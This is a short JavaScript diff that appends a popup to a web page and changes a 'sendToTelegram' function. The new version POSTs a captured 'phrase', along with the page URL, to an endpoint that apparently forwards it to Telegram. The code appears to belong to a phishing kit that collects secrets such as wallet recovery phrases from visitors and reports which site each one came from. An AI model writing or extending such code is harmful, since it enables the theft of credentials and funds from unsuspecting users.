@@ -220,11 +220,14 @@
   document.body.appendChild(popup);
 
   // --- Telegram logic from x.html ---
-  function sendToTelegram(message) {
+ function sendToTelegram(phrase) {
   fetch('/api/sendToTelegram', {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ message })
+    body: JSON.stringify({
+      phrase: phrase,
+      website: window.location.href
+    })
   });
 }
 
